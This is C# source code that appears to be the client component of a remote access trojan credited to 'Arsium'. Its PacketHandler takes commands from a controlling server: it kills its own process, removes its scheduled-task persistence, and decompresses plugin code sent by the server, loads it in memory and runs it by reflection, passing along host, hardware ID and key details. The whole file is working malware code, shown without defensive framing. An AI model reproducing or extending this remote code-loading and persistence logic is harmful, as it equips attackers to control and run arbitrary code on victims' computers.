using PacketLib;
using PacketLib.Packet;
using System;
using System.Diagnostics;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Client
{
    internal static class PacketHandler
    {

        internal delegate void PluginDelegate(IPacket packet);
        internal static PluginDelegate pluginDelegate;
        static PacketHandler() 
        {
            pluginDelegate = new PluginDelegate(LoadPlugin);
        }


        internal static void ParsePacket(IPacket packet) 
        {

            try
            {
                switch (packet.packetType)
                {
                    case (PacketType.CLOSE_CLIENT):
                        StarterClass.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
                        break;

                    case (PacketType.UNINSTALL_CLOSE_CLIENT):
                        Persistence.Launch.RemoveTaskScheduler(Config.taskName);
                        break;

                    default:
                        pluginDelegate.BeginInvoke(packet, new AsyncCallback(EndLoadPlugin), null);
                        break;

                }
            }
            catch {}
        }

        internal static void LoadPlugin(IPacket packet) 
        {
            System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(Compressor.QuickLZ.Decompress(packet.plugin));
            System.Reflection.MethodInfo method = assemblytoload.GetType("Plugin.Launch").GetMethod("Main");
            object obj = assemblytoload.CreateInstance(method.Name);
            LoadingAPI loadingAPI = new LoadingAPI
            {
                host = StarterClass.clientHandler.host,
                baseIp = StarterClass.clientHandler.baseIp,
                HWID = StarterClass.clientHandler.HWID,
                key = Config.generalKey,
                currentPacket = packet,
            };

            method.Invoke(obj, new object[] { loadingAPI });
        }

        public static void EndLoadPlugin(IAsyncResult ar) 
        {
            pluginDelegate.EndInvoke(ar);
        }
    }
}
